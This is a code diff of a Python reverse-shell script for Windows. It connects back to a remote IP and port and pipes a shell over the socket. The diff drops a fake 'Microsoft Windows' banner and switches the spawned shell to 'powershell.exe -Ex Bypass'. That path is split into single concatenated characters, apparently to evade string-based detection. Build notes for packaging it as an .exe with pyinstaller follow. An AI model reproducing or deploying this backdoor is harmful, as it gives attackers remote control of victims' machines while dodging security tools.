@@ -19,26 +19,6 @@ def process2server(s, p):
 
 
 """
-Simulate Windows cmd prompt
-"""
-
-
-def fake_prompt():
-    os.system("cls")
-    """
-    Microsoft Windows [Version 10.0.17134.1069]
-    TWljcm9zb2Z0IFdpbmRvd3MgW1ZlcnNpb24gMTAuMC4xNzEzNC4xMDY5XQ==
-    
-    (c) 2018 Microsoft Corporation. All rights reserved.
-    KGMpIDIwMTggTWljcm9zb2Z0IENvcnBvcmF0aW9uLiBBbGwgcmlnaHRzIHJlc2VydmVkLg==
-    """
-    sys.stdout.write(
-        str((base64.b64decode("TWljcm9zb2Z0IFdpbmRvd3MgW1ZlcnNpb24gMTAuMC4xNzEzNC4xMDY5XQ==").decode("utf-8"))) + "\n"
-        + str((base64.b64decode("KGMpIDIwMTggTWljcm9zb2Z0IENvcnBvcmF0aW9uLiBBbGwgcmlnaHRzIHJlc2VydmVkLg==").decode("utf-8")))
-        + "\n\n" + os.getcwd() + ">"
-    )
-
-"""
 Check arguments
 """
 
@@ -62,7 +42,6 @@ if __name__ == "__main__":
     Begin process to connect back to home :)
     """
     time.sleep(2)
-    fake_prompt()
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((remote_ip, remote_port))
@@ -83,8 +62,19 @@ if __name__ == "__main__":
     
     time.sleep(2)
     # Call Process and TCP
+    ######################
+
+    ## powershell.exe (Sin argumentos)
+    # ["C" + ":" + "\\" + "W" + "i" + "n" + "d" + "o" + "w" + "s" + "\\" + "S" + "y" + "s" + "t" + "e" + "m" + "3" + "2" + "\\" + "W" + "i" + "n" + "d" + "o" + "w" + "s" + "P" + "o" + "w" + "e" + "r" + "S" + "h" + "e" + "l" + "l" + "\\" + "v" + "1" + "." + "0" + "\\" + "p" + "o" + "w" + "e" + "r" + "s" + "h" + "e" + "l" + "l" + "." + "e" + "x" + "e"]
+    
+    ## powershell.exe -Ex Bypass
+    # ["C" + ":" + "\\" + "W" + "i" + "n" + "d" + "o" + "w" + "s" + "\\" + "S" + "y" + "s" + "t" + "e" + "m" + "3" + "2" + "\\" + "W" + "i" + "n" + "d" + "o" + "w" + "s" + "P" + "o" + "w" + "e" + "r" + "S" + "h" + "e" + "l" + "l" + "\\" + "v" + "1" + "." + "0" + "\\" + "p" + "o" + "w" + "e" + "r" + "s" + "h" + "e" + "l" + "l" + "." + "e" + "x" + "e", "-" + "E" + "x", "B" + "y" + "p" + "a" + "s" + "s"]
+    
+    ## cmd.exe
+    # ["c" + ":" + "\\" + "w" + "i" + "n" + "d" + "o" + "w" + "s" + "\\" + "s" + "y" + "s" + "t" + "e" + "m" + "3" + "2" + "\\" + "c" + "m" + "d" + "." + "e" + "x" + "e"],
+
     p = subprocess.Popen(
-        ["c:\windows\system32\cmd.exe"],
+        ["C" + ":" + "\\" + "W" + "i" + "n" + "d" + "o" + "w" + "s" + "\\" + "S" + "y" + "s" + "t" + "e" + "m" + "3" + "2" + "\\" + "W" + "i" + "n" + "d" + "o" + "w" + "s" + "P" + "o" + "w" + "e" + "r" + "S" + "h" + "e" + "l" + "l" + "\\" + "v" + "1" + "." + "0" + "\\" + "p" + "o" + "w" + "e" + "r" + "s" + "h" + "e" + "l" + "l" + "." + "e" + "x" + "e", "-" + "E" + "x", "B" + "y" + "p" + "a" + "s" + "s"],
         shell=True,
         bufsize=0,
         stdout=subprocess.PIPE,
@@ -108,8 +98,8 @@ if __name__ == "__main__":
 """
 Python 3
 --------
-1) Install "Python 3.7" Windows
-2) Install "pyinstaller"
+1) Install "Python 3.7" on Windows
+2) Install "pyinstaller" on Windows
 C:\Python3\Scripts\> pip3.exe install pynstaller
 
 3) Convert from .py to .exe
